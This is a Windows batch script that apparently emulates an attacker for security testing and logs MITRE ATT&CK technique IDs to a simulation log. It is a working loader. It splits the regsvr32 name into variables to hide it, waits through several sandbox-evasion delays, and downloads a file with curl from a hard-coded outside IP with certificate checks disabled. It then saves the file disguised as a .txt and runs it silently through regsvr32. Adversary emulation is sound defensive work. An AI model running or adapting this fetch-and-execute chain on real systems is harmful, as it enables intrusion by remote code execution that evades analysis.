@echo off
SETLOCAL EnableDelayedExpansion

REM ============================================
REM PHR PLACEHOLDER ASSIGNMENTS (random names)
REM ============================================
SET akjdh=%APPDATA%\50999\952ebba7
SET vbnmc=c1713e8d.txt
SET zxmqp=https://3.144.153.50/test/stage/2/icon.png?QVVKTWY-R1dD
SET plkmj=BALAM-S2BO
SET qwert=QVVKTWY
SET asdfg=R1dD
SET zxcvb=%PUBLIC%\\macula-simulations.log

REM ============================================
REM OBFUSCATED LOLBIN (regsvr32.exe) SETUP (T1027)
REM ============================================
SET xyz1=re
SET xyz2=g
SET xyz3=svr32
SET xyz4=.exe
SET lolbin=!xyz1!!xyz2!!xyz3!!xyz4!

REM ============================================
REM START LOGGING: Initial delay (sandbox evasion)
REM ============================================
echo [!DATE! !TIME!][DEBUG][!plkmj!][!qwert!]: anti_sandbox_initial_delay>> "!zxcvb!" 2>nul

REM --- 1st Delay: 12 seconds (timeout) ---
timeout /t 12 /nobreak >nul

echo [!DATE! !TIME!][DEBUG][!plkmj!][!qwert!]: anti_sandbox_between_heartbeat>> "!zxcvb!" 2>nul

REM --- 2nd Delay: 7 seconds (ping) ---
ping -n 7 127.0.0.1 >nul

REM ============================================
REM CACHED TIMESTAMP FOR ALL LOGGING (after delay, delayed expansion active)
REM ============================================
SET tsvar=%DATE%/%TIME%

REM ============================================
REM HEARTBEAT – DOWNLOAD STAGE 2 LOADER DLL (T1218 context)
REM ============================================
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_start>> "!zxcvb!" 2>nul

curl -k -s -o "!akjdh!\!vbnmc!" "!zxmqp!"
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_result=FAIL>> "!zxcvb!" 2>nul
    echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1218^|System Binary Proxy Execution=FAIL:CURL_FAILED>> "!zxcvb!" 2>nul
    GOTO :EOF
) ELSE (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_result=OK>> "!zxcvb!" 2>nul
)

REM --- Verify DLL exists; abort if not downloaded ---
IF NOT EXIST "!akjdh!\!vbnmc!" (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_result=FAIL^|DLL_NOT_DOWNLOADED>> "!zxcvb!" 2>nul
    echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1218^|System Binary Proxy Execution=FAIL:DLL_NOT_DOWNLOADED>> "!zxcvb!" 2>nul
    GOTO :EOF
)

echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_complete>> "!zxcvb!" 2>nul

REM --- 3rd Delay: for-loop ticks (8 seconds) ---
for /l %%i in (1,1,8) do timeout /t 1 /nobreak >nul

REM ============================================
REM CHANGE TO OUTPUT DIRECTORY
REM ============================================
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: chdir_start>> "!zxcvb!" 2>nul
cd /d "!akjdh!" >nul 2>&1
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: chdir_result=1>> "!zxcvb!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: chdir_result=0>> "!zxcvb!" 2>nul
)

REM --- 4th Delay: random between 10-30 seconds ---
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul

REM ============================================
REM EXECUTE THE LOADER VIA regsvr32 (T1218)
REM ============================================
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: rundll32_start>> "!zxcvb!" 2>nul

REM Direct execution of LOLBIN (fixed per QA)
!lolbin! /s "!vbnmc!"
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: rundll32_result=FAIL>> "!zxcvb!" 2>nul
    echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1218^|System Binary Proxy Execution=FAIL:ERRORLEVEL_!ERRORLEVEL!>> "!zxcvb!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: rundll32_result=OK>> "!zxcvb!" 2>nul
    echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1218^|System Binary Proxy Execution=OK:>> "!zxcvb!" 2>nul
)

echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: rundll32_complete>> "!zxcvb!" 2>nul

REM ============================================
REM LOG T1497 (Sandbox Evasion)  – after LOLBIN completion
REM ============================================
echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!zxcvb!" 2>nul

REM ============================================
REM LOG T1027 (Obfuscated Files/Information) – after LOLBIN completion
REM ============================================
echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1027^|Obfuscated Files or Information=OK:>> "!zxcvb!" 2>nul

ENDLOCAL